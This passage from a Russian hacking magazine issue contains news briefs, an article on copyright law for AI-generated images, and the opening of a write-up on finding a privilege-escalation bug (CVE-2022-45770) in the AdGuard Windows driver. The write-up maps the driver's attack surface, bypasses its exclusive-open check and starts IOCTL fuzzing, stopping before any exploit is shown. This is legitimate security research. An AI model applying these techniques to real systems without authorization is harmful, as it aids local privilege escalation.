         не демонстрирует вредоносного поведения при хранении на диске, «
           поскольку получает код от ChatGPT, а затем выполняет его, не оставляя
          следов в памяти. Кроме того, мы всегда имеем возможность попросить
        ChatGPT изменить код», — сообщили специалисты.                 »

  88 200 ДОМЕНОВ В ЗОНЕ .RU ЗАКРЫЛИСЬ

   Согласно  статистике  «Технического  центра Интернет»  (поддерживает  главные  реестры
   доменов .ru, .рф, .su), в 2022 году количество доменов в зоне .ru сократилось до 4,93 мил-
  лиона доменов, лишившись сразу 88 200 доменов. Дело в том, что по итогам 2022 года
   более 250 тысяч физлиц и ИП перестали быть администраторами, а также от доменов отка‐
   зались многие нерезиденты и инвесторы.


   При этом пространства .рф и .su впервые с 2016 года показали рост, хотя и символический —
   на 1308 (до 676 200 доменов) и 514 (до 105 900)  соответственно. Для  сравнения:
   в течение 2021 года число доменов зоны .рф снизилось на 36 800, а число доменов .su —
   на 3400.

  В ТЦИ отмечают, что после начала специальной военной операции на Украине крупнейший
   в мире регистратор GoDaddy прекратил перепродажу и оформление регистраций доменов .ru
   и так же поступил сервис 101domains. Регистраторы Namecheap, Bluehost и Ionos ограничили
   или прекратили работу с клиентами из РФ.





 СЛИВ CELLEBRITE
 И MSAB
   Группа  хактивистов  Enlace  Hacktivista  заявила,  что  анонимный  источник
  передал ей ПО и документацию компаний Cellebrite и MSAB, которые предос‐
   тавляют  правоохранительным  органам  многих  стран мира  инструменты
  для взлома мобильных устройств и проведения других киберкриминалистичес‐
   ких операций.
      Напомню, что Cellebrite — это независимые киберкриминалисты, которые
   специализируются  на  извлечении  данных  с  мобильных  устройств  (iOS
  и Android). К примеру, несколько лет назад израильскую фирму называли
  основным кандидатом на роль подрядчика ФБР, когда правоохранители иска‐
  ли специалистов для взлома iPhone террориста.
    В целом Cellebrite не раз помогала правительствам и правоохранительным
   органам разных стран взламывать конфискованные мобильные телефоны (в
  основном за счет использования уязвимостей, которые игнорировали произво‐
   дители устройств) и не раз подвергалась критике со стороны правозащитников
  и СМИ.
      Аналогичной деятельностью занимается и криминалистическая компания
  MSAB из Швеции.
     Как  сообщили  представители  Enlace   Hacktivista,  в  их  руках   ока‐
   зались 1,7 Тбайт данных Cellebrite и 103 Гбайт данных MSAB. Файлы уже опуб‐
   ликованы в открытом доступе, их можно скачать через сайт DDoSecrets, сайт
   Enlace Hacktivista и через торрент.





   Хактивисты напомнили, что инструменты обеих компаний нередко используют‐
   ся для сбора информации с телефонов журналистов, активистов и диссидентов
  по всему миру, сами компании не раз обвиняли в том, что они работают с реп‐
   рессивными режимами, а их ПО неоднократно применялось для прямого
   нарушения прав человека.
     При этом нужно заметить, что для Cellebrite это далеко не первая утечка
   данных. Первый раз, еще в 2016 году, инструменты киберкриминалистов слу‐
   чайно слила в сеть использовавшая их компания McSira Professional Solutions.
  Годом позже, в 2017-м, Cellebrite и вовсе подверглась хакерской атаке. Тогда
   у компании похитили более 900 Гбайт данных, которые в итоге были опуб‐
   ликованы в открытом доступе.


  ГЛАВА OPENAI СРАВНИЛ CHATGPT С КАЛЬКУЛЯТОРОМ





   Сэм Альтман, глава компании OpenAI, создавшей языковую модель ChatGPT, дал изданию
    StrictlyVC интервью, в котором поделился своими мыслями о будущем ИИ, постарался раз‐
   веять опасения о создании сильного ИИ (AGI), а также описал лучший и худший сценарий раз‐
   вития ситуации для человечества. Выбрали для тебя наиболее интересные цитаты:

            «Думаю, лучший сценарий так невероятно хорош, что мне даже трудно →          это вообразить. Он так хорош, что ты кажешься психом, когда начинаешь рас‐
           сказывать об этом. Могу представить, каково это, если у нас [человечества]
           появится невероятное изобилие и системы, которые смогут разрешать тупико‐
         вые ситуации, улучшат все аспекты реальности и позволят всем нам жить луч‐
        шей жизнью».
              «Плохой сценарий (и я считаю, что важно говорить об этом) — это вроде
           как смерть для всех нас. Поэтому сложно переоценить важность безопасности
         ИИ. Но меня больше беспокоят вероятные злоупотребления в краткосрочной
            перспективе».
              «У нас нет настоящего AGI. Полагаю, [AGI] — это то, чего от нас ждут,
          но  тогда GPT-4 разочарует людей, которые ожидают  чего‑то подобного.
         Переход к AGI в целом будет не таким резким, как ожидают некоторые. Думаю,
         он получится гораздо более размытым и постепенным».
              «Генеративный текст — это то, к чему нам всем нужно адаптироваться. Мы
           адаптировались к калькуляторам и изменили тестирования на уроках матема‐
           тики. Без сомнения, [ChatGPT] — это более экстремальная версия, но и преиму‐
           щества от нее тоже более экстремальные».





 ДАРКНЕТ ПЕРЕХОДИТ
 НА ПРИЛОЖЕНИЯ
 ДЛЯ ANDROID
   Специалисты из компании Resecurity заметили, что маркетплейсы даркнета,
   торгующие наркотиками и другими незаконными веществами, начали исполь‐
   зовать собственные приложения для Android, чтобы повысить конфиденциаль‐
   ность и избежать внимания правоохранительных органов.
      Исследователи наблюдают эту тенденцию с третьего квартала 2022 года.
  По их мнению, такое поведение преступников стало ответом на прошлогодние
   действия правоохранительных органов в целом и закрытие «Гидры» в частнос‐
   ти.  После ликвидации  этого  маркетплейса  правоохранителями  несколько
  более мелких игроков попытались воспользоваться ситуацией и переманить
   аудиторию «Гидры» к себе.
      Эксперты привели сразу семь примеров торговых площадок, выпустивших
   APK-файлы собственных Android-приложений, через которые клиенты могут
   получить  доступ к магазинам и сервисам: Yakudza, TomFord24, 24Deluxe,
  PNTS32, Flakka24, 24Cana и MapSTGK. Интересно, что все они использовали
   движок M-Club CMS для создания своих APK, то есть, скорее всего, восполь‐
   зовались услугами одного и того же разработчика.

         «Некоторые из этих мобильных приложений были недавно обнаружены
        нашими  экспертами  на  мобильных  устройствах,  изъятых  правоох- «
         ранительными  органами, они  принадлежали  нескольким  подозрева-
        емым, причастным к торговле наркотиками и другим незаконным опе-
          рациям», — рассказали в Resecurity.                 »
   Отчет компании гласит, что такие приложения позволяют передавать данные
  о заказах наркотиков, а также отправлять покупателю географические коор‐
  динаты «клада», оставленного курьером. Так как обмен информацией теперь
   происходит в нескольких разных приложениях, это порождает фрагментацию
  и мешает правоохранительным органам отслеживать преступников.

         «Информация  (в  приложениях)  передается  в  виде  изображений
         для предотвращения возможной индексации. Сообщения могут содер- «
         жать сведения о том, насколько глубоко „клад“ спрятан под землей,
        и любую другую информацию для его поиска», — сообщили аналитики.                 »
  В Resecurity считают, что большинство новых торговых площадок в 2023 году
   будут использовать собственные приложения для Android, которые постепенно
   вообще заменят собой привычные пользователям форумы и маркетплейсы.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Приватные репозитории Slack на GitHub скомпрометированы


   Данные 200 миллионов пользователей Twitter опубликованы в открытом доступе


   Хакеры обходят CAPTCHA на GitHub для автоматизации создания учетных записей


   Исследователи взломали автомобильные номера, работающие на электронных чернилах


  ИИ Microsoft может имитировать голос человека по трехсекундному образцу


  В защищенном мессенджере Threema нашли серьезные уязвимости


   Хакеры утверждают, что похитили данные 3,5 миллиона пользователей почты Mail.ru


   Американские власти закрыли криптовалютную биржу Bitzlato, связав ее с Conti и Hydra


   Малварь Hook позволяет удаленно контролировать смартфоны на Android


   Хакеры продают исходники League of Legends на аукционе
HEADER





           РАЗБИРАЕМСЯ
     С ЮРИДИЧЕСКИМ СТАТУСОМ
      ТВОРЧЕСТВА НЕЙРОСЕТЕЙ




Диффузионные нейросети Stable Diffusion,
Midjourney, Dream и им подобные стоят
на пороге превращения из занимательной
игрушки в рабочий инструмент. Что дол‐
жно произойти, чтобы творчество искусс‐          Олег Афонин                                                                                       Эксперт по мобильной
твенного   интеллекта   смогло   выйти       криминалистике компании                                                                                     «Элкомсофт»
из юридической «серой зоны»?                              aoleg@voicecallcentral.com


Генерируемые нейросетями изображения не только всколыхнули пользовате‐
лей соцсетей, но и нашли вполне «взрослое» применение. Картинки, которые
выдают нейросети, вовсю используются для создания иллюстраций (в том чис‐
ле и в «Хакере») — и в исходном виде, и художниками в качестве основы.
   Диффузионные нейросети тем временем работают в своеобразной «серой
зоне» авторского права. Крупные компании обходят творчество нейросетей
стороной, опасаясь возможных юридических последствий, а частные поль‐
зователи о легальных аспектах даже не задумываются.





      «Девочка с персиками», Midjourney, по мотивам Валентина Серова

Юридическая база, регулирующая деятельность искусственного интеллекта,
не наработана; законы об авторском праве нуждаются в уточнениях. Попробу‐
ем  разобраться, нарушают ли что‑нибудь  создатели диффузионных  ней‐
росетей и потребители сгенерированных ими изображений.
   «Художественные» диффузионные нейросети способны создавать необыч‐
ные,  а при  некотором  старании —  весьма  качественные  изображения
по заданным ключевым словам. Уже появилось поколение дизайнеров, боль‐
шая часть работы которых — грамотно составить запрос на генерацию нужного
заказчику изображения.
  В результате часто получаются яркие, необычные, оригинальные картинки,
непохожие на существующие арты. Отложим вопрос о техническом несовер‐
шенстве и некоторой «корявости» изображений; в конце концов, нейросетям
без году неделя, у них всё впереди. Поговорим вот о чем: кому принадлежит
результат работы искусственного интеллекта, можно ли его законно исполь‐
зовать в коммерческих целях и не нарушает ли это чьих‑либо прав?
  В  качестве «сферического ИИ в вакууме» рассмотрим  продукт Stable
Diffusion. Это некоммерческое решение с предельно щедрой лицензией. Сог‐
ласно этой лицензии созданные при помощи нейросети арты принадлежат
конечному пользователю, который сгенерировал запрос. Казалось бы, что
может быть неоднозначного в лицензии, которая предоставляет «perpetual,
worldwide, non-exclusive, no-charge,  royalty-free, irrevocable copyright license
to reproduce, prepare, publicly display, publicly perform, sublicense, and distribute
the Complementary Material, the Model, and Derivatives of the Model»?
   Однако такую неоднозначность нашли. Первой ласточкой стала широко
известная в узких кругах публикация в одной «экстремистской» социальной
сети. Пользователь с подпольной кличкой Eugene Arenhaus пишет:

      Последнее время некоторые мои френды активно постят продукцию
       Midjourney и  прочих  «генераторов  изображений» на  основе  Stable«
        Diffusion. Видимо, мне придется писать подробный разбор этой тех-
      нологии. А пока прошу вас всех этого не делать — не репостить «ИИ
       нарисовал  картинку» и не  пользоваться самим.  Основание:  факты
       показывают, что под видом «ИИ» нам втюхивают нечто вроде фоторо-
       бота,  в  которого  заложены более  полумиллиарда исходных  изоб-
      ражений, взятых из интернета без спросу и с нарушением огромного
       количества авторских прав и лицензионных соглашений.
         Каждый кусочек в любом «ИИ нарисовал» на деле нарисовал худож-
       ник, которого обокрали разработчики Stable  Diffusion и составители
      базы LAION-5B.                »
В данном случае автор сообщения чрезмерно упрощает проблему. Изоб‐
ражения, генерируемые диффузионными нейросетями, не являются  «кол‐
лажем» или «фотороботом», а утверждение про то, что у «кусочков» работ ИИ
есть настоящие авторы, по меньшей мере спорное. И как раз такой спор
открыт в виде судебного иска Stable Diffusion litigation (в The Verge публиковал‐
ся подробный разбор).

       Stable Diffusion относится к категории систем искусственного интеллек-
        та, называемых генеративным ИИ. Эти системы обучаются на опре-«
      деленном виде творческих работ — к примеру, на тексте, программном
      коде или изображениях — и затем микшируют эти работы для получе-
      ния («генерации») других работ того же вида.
          Скопировав пять миллиардов изображений без согласия оригиналь-
      ных художников, Stable Diffusion использует математический процесс,
      называемый диффузией, для хранения сжатых копий этих обучающих
       изображений, которые, в свою очередь, рекомбинируются для получе-
      ния  других изображений. Иными словами, это  инструмент XXI века
      для производства коллажей.
          Полученные изображения могут внешне напоминать или не напоми-
       нать  изображения, которые  нейросеть  использовала для  обучения.
      Независимо  от   этого,   сгенерированные  изображения   получены
      из копий обучающих изображений и конкурируют с ними на рынке.
     В лучшем случае способность Stable Diffusion наводнить рынок прак-
       тически  неограниченным  количеством  контрафактных  изображений
      нанесет непоправимый ущерб рынку искусства и художников.                »
Что мы видим из сути предъявленных претензий? Авторы иска признают, что
сгенерированные нейросетью картинки могут получаться совершенно непохо‐
жими на оригиналы, в то время как «существенное сходство» всегда было
классическим признаком, на который опирались судебные эксперты в попыт‐
ках  определить,  является  ли  рассматриваемая  работа  «производным»
или «оригинальным» произведением.


Что такое «производное произведение» и «существенное
сходство»?
С  точки  зрения законов об авторском  праве  произведения,  основанные
на других работах, могут быть «производными произведениями». Авторские
права на такие произведения определяются законами США следующим обра‐
зом: «Производные работы могут быть созданы с разрешения владельца
копирайта или из работ, которые являются всеобщим достоянием».
   Российское  законодательство видит «производные  произведения»  так:
«Создавая произведение, основанное на производном, вы создаете новое,
защищенное авторским правом произведение. В то же время права на ори‐
гинальный объект также остаются и никуда не пропадают. Публиковать про‐
изводные произведения можно с разрешения автора оригинального произве‐
дения».
   Производное произведение необязательно должно точно повторять ори‐
гинал, чтобы оно было признано именно «производным». Более того, в цир‐
куляре Circular 14: Copyright in Derivative Works and Compilations (PDF) при‐
водятся такие примеры производных произведений, как  «скульптура,  соз‐
данная по рисунку», «рисунок, сделанный по фотографии», «литографический
оттиск, основанный на картине» (это довольно древний закон: под литографи‐
ей в нем подразумеваются вовсе не принты на футболках).
   Основным критерием «производного произведения»  считается «сущес‐
твенное сходство» (substantial similarity) между оригинальной и производной
работами. Четкого определения «существенного сходства» нет, однако сущес‐
твует судебная процедура, позволяющая определить его в каждом конкретном
случае.



Таким образом, авторы иска жалуются не на то, что сгенерированные ИИ
работы визуально похожи (имеют «существенное сходство») на работы живых
художников, а на то, что защищенные законом об авторском праве изоб‐
ражения использовались без разрешения правообладателей в новом качестве:
в качестве обучающего материала. Грубо говоря, если суд станет на сторону
истцов, сгенерированные нынешним поколением нейросетей картинки могут
стать «нелицензионными» со всеми вытекающими последствиями независимо
от того, есть ли в них «существенное сходство» с оригиналами или нет.





  «Купание красного коня», Midjourney, по мотивам Кузьмы Петрова‑Вод‐
  кина

Так ли это на самом деле? Stable Diffusion действительно берет для трениров‐
ки «картинки из интернета» (надеюсь, мне не нужно объяснять, что случайно
взятую «картинку из интернета» нельзя просто так использовать, например,
в качестве обложки для книги?). Для создания базы данных были привлечены
миллионы изображений как из области публичного достояния (public domain),
так и защищенных более или менее жесткими лицензиями.
   Лицензии бывают разные: от практически неограниченных (можно исполь‐
зовать как угодно без указания авторства оригинала) до чрезвычайно лимити‐
рованных (разрешаются только оговоренные в лицензии виды применения,
причем исключительно лицензиату). В данном иске истцы утверждают, что ней‐
росеть использовала для обучения «огромное  число работ, защищенных
авторским правом, без согласия, упоминания и компенсации [правообладате‐
лям]».
   Собственно, вот мы и дошли до сути иска. В споре хозяйствующих субъ‐
ектов одна  сторона  (создатели  моделей)  хочет  обучить  искусственный
интеллект на миллионах бесплатных картинок, а авторы оригинальных изоб‐
ражений, может быть, и не против, но хотели бы, чтобы им компенсировали их
труд или хотя бы отнеслись с должным уважением.





         «Звездная ночь», Midjourney, по мотивам Винсента Ван Гога

Кто здесь прав? Признаюсь, я не знаю, и, пожалуй, не знает никто. Если будет
решение суда (а его может и не быть, если стороны договорятся во внесудеб‐
ном порядке), то будет создан прецедент, который может оказать серьезное
влияние на законодательство, регулирующее создание «производных произве‐
дений». А вот сам факт того, что был инициирован судебный процесс, я вос‐
принимаю сугубо положительно. Неожиданно? Совсем нет, и вот почему.


ВЫХОД ИЗ СЕРОЙ ЗОНЫ

Сегодня как сами диффузионные нейросети, так и созданные ими изоб‐
ражения находятся в своеобразной серой зоне законов об авторском праве.
Сейчас мы можем наблюдать момент зарождения нового явления, для регули‐
рования которого пока что нет ни правовой основы, ни тем более правоп‐
рименительной  практики. Вспомним интернет в начале  своего  развития
и  вспомним  «картинки  из  интернета»,  которые  частенько  встречались
на обложках книг, издаваемых вполне уважаемыми издательствами.
  В каком положении окажутся диффузионные нейросети завтра, через год,
через десять лет? Думаю, со временем статус нейросетей будет закреплен
законодательно. А вот каким именно образом — пока неизвестно. Может быть,
разработчиков нейросетей обяжут использовать для обучения только работы
из области всеобщего достояния. Быть может, в лицензию Creative Commons
добавится  пункт,  упоминающий  нейросети, в явном виде разрешающий
или запрещающий использование лицензионных картинок для обучения ИИ.
  А может быть, создателей или операторов ИИ заставят выплачивать роялти
правообладателям. Или не правообладателям, а в некий вновь созданный кол‐
лективный орган  управления  авторскими правами  (нервно оглядываемся
на Михалкова). Когда это произойдет, бизнесы вздохнут с облегчением: вмес‐
то бесплатных картинок с непонятными (и оттого страшными) юридическими
последствиями они получат доступ к очень дешевым сгенерированным изоб‐
ражениям, которые можно будет безбоязненно использовать в коммерческих
целях.
  А что художники, авторы оригинальных изображений, на которых трениру‐
ются нейросети? Полагаю, они окажутся в той же ситуации, в которой ока‐
зались профессиональные фотографы после появления фотобанков (спойлер:
они не вымерли).


Getty Images против Stability AI
Через несколько дней после публикации статьи на создателей Stable Diffusion
подал в суд один из крупнейших фотобанков Getty Images. Суть претензии —
в нарушении авторских прав компании на этапе обучения нейросети.
  В отличие от коллективного иска, который мы подробно разобрали в статье,
шансы Getty Images оцениваются юристами гораздо выше, но даже в этом слу‐
чае большинство участников соглашается, что результат процесса может быть
неожиданным. Добавим сюда такой прецедент: в Getty ранее уже лицен‐
зировали изображения разработчикам  других нейросетей, а разработчики
Stable Diffusion решили не платить за использование тех же изображений
и метаданных.
   Андрес Гуадамаз специализируется на искусственном интеллекте и автор‐
ском праве. По его словам, иск Getty «имеет серьезные шансы на успех». «Иск
Getty сформулирован гораздо точнее [предыдущего]  коллективного иска.
Дело, скорее всего, будет основываться на иске о нарушении авторских прав,
а ответчики, вероятно, будут настаивать на позиции "добросовестного исполь‐
зования". Непонятно, что получится в итоге.»
   Аарон Мосс, юрист по авторскому праву в Greenberg Glusker и издатель
блога Copyright Lately, согласен, что новый иск сформулирован удачнее упо‐
мянутого  коллективного иска. «Иск  сфокусирован  ровно  так,  как  нужно:
на входном  этапе, принимающем для обучения нейросети изображения,
защищенные авторским правом. Это будет захватывающая битва за право
добросовестного использования».



ПАРА СЛОВ О «ПРЕЗУМПЦИИ НЕВИНОВНОСТИ»

В сети уже сломано немало копий по поводу «суда над искусственным
интеллектом». Наиболее прогрессивные (сарказм!) участники дискуссий даже
использовали слова «презумпция невиновности». Уточню: поданный в аме‐
риканский суд иск не имеет отношения к уголовному праву, в котором дей‐
ствует презумпция невиновности с требованием доказательств «при отсутс‐
твии обоснованного сомнения» (beyond reasonable doubt). В рамках граждан‐
ского процесса истцу достаточно доказать «небрежение» ответчика с 51-про‐
центной степенью достоверности. В российском же гражданском праве и вов‐
се действует «презумпция вины», в рамках которой нарушитель считается
виновным до тех пор, пока не докажет свою невиновность.





             «Поцелуй», Midjourney, по мотивам Густава Климта


К СЛОВУ, О ФОТОГРАФИЯХ

Изображения, которые генерирует нейросеть, — это результат работы вычис‐
лительной техники и алгоритмов (совсем как в современной цифровой фотог‐
рафии), а роль пользователя, который подбирает нужные ключевые слова,
чем‑то напоминает работу фотографа. Каким образом законы об авторском
праве защищают фотографии?
  В этой области «голливудское право» (то, как обыватель представляет себе
работу правоохранительных органов по соответствующим фильмам) учит нас
тому, что автором каждой фотографии  считается человек, который нажал
на кнопку, а его авторские права защищаются... защищаются... а как они, собс‐
твенно, защищаются?
  За подробностями отправлю к статье «Правовые режимы фотографии
в российском праве», опубликованной в июне 2021 года в журнале Суда
по интеллектуальным правам. Если в двух словах, то всё несколько сложнее,
чем можно понять из голливудских боевиков. Так, из статьи по ссылке мы узна‐
ем, что германское право отделяет фотографические произведения (нем.
Lichtbildwerk),  на  которые  распространяется  авторско‑правовой  режим,
от «простых» фотографий (нем. Lichtbild), являющихся объектом смежных прав.
При этом закон не устанавливает четких критериев для отнесения фотоизоб‐
ражения к той или иной категории, упоминая лишь, что произведением,
по смыслу закона, считается только личное интеллектуальное творение.
   Принятый в Германии подход соответствует подходу Евросоюза, в котором
авторско‑правовая охрана предоставляется не просто эстетическим фотог‐
рафиям, но только тем из них, которые отражают личность автора.
   Несколько отличается от принципов «голливудского права», не так ли?
А ведь есть еще довольно близкие к нашей сегодняшней теме «фотоизоб‐
ражения,  создаваемые с помощью  дополнительных  приложений и  прог‐
рамм» — для них нет четко прописанных законов, но есть мнения:


        ...используя графический редактор, автор создает новое изображение,
      которое является оригинальным, то есть отражающим  индивидуаль-«
      ность создавшего его лица. И следует обратить внимание на  сле-
     дующий момент: если основой такого фотопроизведения стало другое
       оригинальное фото, есть все основания говорить о создании  про-
       изводного произведения (п. 1 ст. 1260 ГК РФ), что налагает на автора
       производного   произведения    обязанность   получения    согласия
      на использование первоначального произведения.                »
Также определены «фотографии, создаваемые без участия субъекта права»,
создаваемые в автоматическом режиме или получаемые случайным образом
под влиянием каких‑либо внешних факторов — например, камера среагирова‐
ла на животное, появившееся в кадре. Автор статьи пишет:


        Поскольку субъектом авторского права может быть только физическое
      лицо, в случае если фотография была сделана животным, авторские«
       права на нее не возникают (в том числе ни у владельца фотоаппарата,
      ни у хозяина животного) — по сложившемуся мнению, полученную
      фотографию следует рассматривать как общественное достояние.                »
Похожего мнения  придерживается и Андрей Васин,  партнер,  патентный
поверенный, «Стэндмарк», согласившийся прокомментировать нашу статью.


Комментарий юриста
Можно ли назвать создаваемое ИИ изображение «произведением»? С точки
зрения российского законодательства — нет, так как автором произведения
науки, литературы или искусства признается гражданин, творческим трудом
которого оно создано (ст. 1257 ГК РФ), и именно автору, как физическому
лицу, изначально принадлежит исключительное право на произведение, право
авторства и другие права в соответствии со ст. 1255 ГК РФ.
  Я также считаю, что пользователь, который сгенерировал запрос, не явля‐
ется правообладателем (автором) получившегося в результате такого запроса
изображения, так как объект все‑таки создает не он, а нейросеть. В противном
случае пользователь, сформировавший определенный запрос в каком‑либо
поисковом   сервисе,  может   претендовать  на  исключительные   права
на полученные результаты такого запроса. Следующая сложность заключается
в квалификации процесса обучения ИИ. Если считать создание изображений
переработкой произведений, защищенных авторским правом, то как опре‐
делить, какое из миллиардов изображений было переработано и в какой части
оно было воспроизведено в итоговом изображении? Если считать, что процесс
обучения ИИ сходен с процессом развития интеллекта человека, то получа‐
ется, что нейросеть учится технике создания изображений, и в этом случае
вопрос с переработкой отпадает сам собой.
  При текущих обстоятельствах я считаю, что созданные художественной ней‐
росетью изображения являются свободными для использования любым лицом
в любых целях. Независимо от этого, за автором и иным правообладателем
сохраняется возможность защиты своих прав, если в каком‑либо созданном
нейросетью изображении он узнает свое произведение.
  — Андрей Васин, партнер, патентный поверенный, «Стэндмарк»



ВЫВОДЫ

Я с большим интересом наблюдаю за иском против разработчиков систем
диффузионных нейросетей. Думаю, как и многим, мне хотелось бы получить
инструмент для генерации лицензионно чистых изображений. Определить сте‐
пень и условия «лицензионности» и должен прецедент, который может быть
создан по результатам судебного процесса.
COVERSTORY





ИЩЕМ И ЭКСПЛУАТИРУЕМ
УЯЗВИМОСТЬ В ДРАЙВЕРЕ
ADGUARD ДЛЯ WINDOWS




В этой  статье  я  расскажу,  как нашел
бинарный баг в драйвере AdGuard. Уяз‐
вимость получила номер CVE-2022-45770.
Я покажу, как изучал блокировщик  рек‐
ламы и раскрутил уязвимость до локаль‐        Марсель Шагиев                                                                                      matador.garta@gmail.com
ного повышения привилегий. По дороге
поизучаем  низкоуровневое  устройство
Windows.


             INFO

                      За консультацию в процессе исследования спа‐
                      сибо  @Denis_Skvortcov. В  его  блоге  крутые
                        статьи  на  тему   эксплуатации   уязвимостей
                        в  антивирусах  для  Windows.  Сейчас  взгляд
                     Дениса пал на Avast.


           WARNING

                       Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный  с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



КАК ВСЕ НАЧИНАЛОСЬ

Я мало что понимал в виндовых драйверах до того, как прочитал книгу Павла
Йосифовича Windows Kernel Programming. В книге все начинается с простого
драйвера в духе Hello World и заканчивается сложным драйвером‑фильтром.
Также рассказывается про отладку драйверов в виртуальной машине с WinDbg
на хосте и про типичные ошибки программирования драйверов. После проч‐
тения,  конечно же,  хочется применить  знания на  практике и  разобрать
какой‑нибудь драйвер. Может, нам повезет и мы найдем уязвимость?


             INFO

                       Статья рассчитана на тех, кто немного разбира‐
                        ется в реверс‑инжиниринге сишного кода. В ней
                       не будет подробного разбора процесса реверса.
                      За более детальным описанием реверса обра‐
                       тись к моей первой статье « Разборки на куче.
                            Эксплуатируем  хип  уязвимого  SOAP-сервера
                       на Linux ».



ПОЧЕМУ ADGUARD

AdGuard — классный блокировщик рекламы, поддерживающий шифрованный
DNS (DoH, DoT, DoQ). Чтобы блокировать рекламные запросы всех приложе‐
ний, а не только браузера, используется WDM-драйвер. Давай установим
AdGuard на Windows 10 в виртуальной машине и начнем его изучать.
   Так получилось, что я установил сборку для x86, поэтому исследовать мы
будем 32-битный драйвер.


ПОВЕРХНОСТЬ АТАКИ

Первым делом нужно убедиться, что драйвер находится на поверхности атаки.
То есть непривилегированное приложение может открыть драйвер для вза‐
имодействия — чтения, записи и отправки IOCTL. В этом нам поможет пара
строк на PowerShell с библиотекой NtObjectManager за авторством Джеймса
Форшоу.
   Для определения артефактов (файлов, ключей реестра) исследуемого про‐
дукта прекрасно подходит утилита от Microsoft Attack Surface Analyzer. С ее
помощью нужно собрать два снапшота ОС: до установки исследуемой прог‐
раммы и после, а также создать дифф, который покажет установленные арте‐
факты. Таким образом можно определить путь девайса в Object-Manager:


\Device\CtrlSM_Protected2adgnetworkwfpdrv





                 Ошибка при открытии девайса драйвера

Драйвер     открыть     не      получилось.     Ошибка     0xC000010
STATUS_INVALID_DEVICE_REQUEST, и это не 0xC0000022 ACCESS_DENIED! Зна‐
чит, доступ к девайсу драйвера у нас есть, но драйверу что‑то не понравилось
в нашем запросе. Такое странное поведение — отличный повод приступить
к реверсу. Давай откроем драйвер в IDA и посмотрим на несколько важных
мест.
   Первое место — инициализирующий код драйвера в функции DriverEntry.





                   Функция создания девайса драйвера

Функция IoCreateDevice() потенциально небезопасна, так как не позволяет
явно указать DACL. Таким образом, DACL берется либо из .INF-файла, либо
из DACL-треда или процесса, который его создает. Также отметим, что девайс
создается с неэксклюзивным доступом (EXCLUSIVE_FALSE).


             INFO

                            Рекомендуется                     использовать
                   IoCreateDeviceSecure(), куда можно явно
                       передать DACL.


Аргумент FILE_DEVICE_SECURE_OPEN присутствует. Если бы его не было, то
было бы можно обойти строгий DACL, открыв произвольный файл на этом
девайсе. Смотрим дальше.
   Флаг DO_DIRECT_IO говорит о том, что usermode-буферы для вызовов
WriteFile() и ReadFile() будут мапиться в пространство ядра и у нас есть
возможности для  атаки TOCTOU в случае double fetch в коде драйвера.
Если бы на месте этого флага был METHOD_NEITHER, было бы еще интереснее.
   Здесь тоже все нормально, двигаемся дальше.
   Второе место — функция — обработчик открытия девайса драйвера. Найти
ее просто. В коде инициализации драйвера необходимо явно назначить обра‐
ботчики функций OpenFile(), WriteFile() и ReadFile().





              Обработчики usermode-запросов в коде драйвера

На скриншотах IDA ты видишь названия переменных и функций, придуманных
мной во время реверса. Конечно же, символа от бинаря нам никто не даст.


OSR Online IOCTL Decoder
Флаг DO_DIRECT_IO влияет на метод передачи данных из юзермода в ядро
только для FileRead() и FileWrite(). Для DeviceIoControl() метод зашит
в код IOCTL. Для быстрого просмотра метода можешь использовать ресурс
osronline.com.





Без труда находим обработчик открытия девайса.





                         Обработчик IRP_MJ_CREATE

Здесь реализован кастомный эксклюзивный доступ к драйверу — PID открыв‐
шего его процесса сохраняется в глобальную переменную hasOwner. Сле‐
дующая     попытка     открыть     драйвер      возвращает     ошибку
STATUS_INVALID_REQUEST.
  И что это за PID? Кто открыл драйвер раньше всех? Это сервисный процесс
AdguardSvc.exe. Можем ли мы на него воздействовать? На удивление — да.
Убить его через Terminate() нам не хватит прав, но у UI-процесса AdguardUI.
exe есть кнопка «Выключить защиту».





                     Диалоговое окно отключения AdGuard

Когда процесс AdguardSvc.exe закроется, снова попробуем открыть девайс
драйвера.



        Get-NtFile() с теми же аргументами возвращает другой результат

Получаем права на чтение, запись и отправку IOCTL от непривилегированного
пользователя. Отлично! Поверхность атаки определена.
  На данном этапе исследования можно отметить две ошибки.
 1. Своя реализация эксклюзивного доступа к драйверу вместо нужных аргу‐
   ментов в IoCreateDevice(EXCLUSIVE_TRUE) . Некритично.
 2. Архитектурно задумано так, что сервисный привилегированный процесс
   эксклюзивно открывает девайс. Тогда было бы логично повесить на девайс
   соответствующий DACL, а по факту доступ имеют все. Критично, так как это
   сломало бы весь attack chain.

Исследование можно было заканчивать после неудачной попытки открыть
девайс драйвера, но мы внимательно отнеслись к коду ошибки и получили
первую зацепку.
    Кстати, проверить DACL девайса ты можешь и с помощью такой команды:


icacls.exe \\ . \D evice \<name>

Либо:


accesschk.exe -l \\ . \GLOBALROOT\D evice \<name>

В дизассемблерном листинге мы заметили большое количество обработчиков
IOCTL. Что можно сделать вместо того, чтобы реверсить каждый?


ФАЗЗИНГ

Фаззинг драйверов несколько сложнее фаззинга юзермодных приложений,
потому что работа происходит не с виртуальным пространством единствен‐
ного процесса, а со всей ОС целиком. Отсюда усложнение инфраструктуры —
установка агента в виртуальную машину и запуск ее в QEMU/KVM, как, нап‐
ример, в фаззере kAFL.
  Но давай не будем плодить сущности сверх необходимого и найдем
что‑нибудь попроще, а если не сработает простой вариант, то уже тогда нач‐
нем фаршировать инфраструктуру агентами и виртуализацией. Этот простой
вариант — фаззер Dynamic Ioctl Brute-Forcer (DIBF). Он просто отправляет ран‐
домные IOCTL из юзермода в драйвер. Без хитрых мутаций, без сбора пок‐
рытия, без сохранения стектрейса.


Подготовка
Воспользуемся двумя фичами Windows, которые улучшат качество фаззинга.
   Во‑первых, включим дополнительные проверки для исследуемого драй‐
вера через утилиту Driver  Verifier. Это нужно, чтобы повысить вероятность
нахождения бага.





Во‑вторых, попросим Windows собирать более полный дамп памяти в случае
падения с BSOD. Это поможет нам в анализе крашей.





DIBF
DIBF запускаем вот такой командой:


dibf.exe \\ . \CtrlSM_Protected2adgnetworkwfpdrv

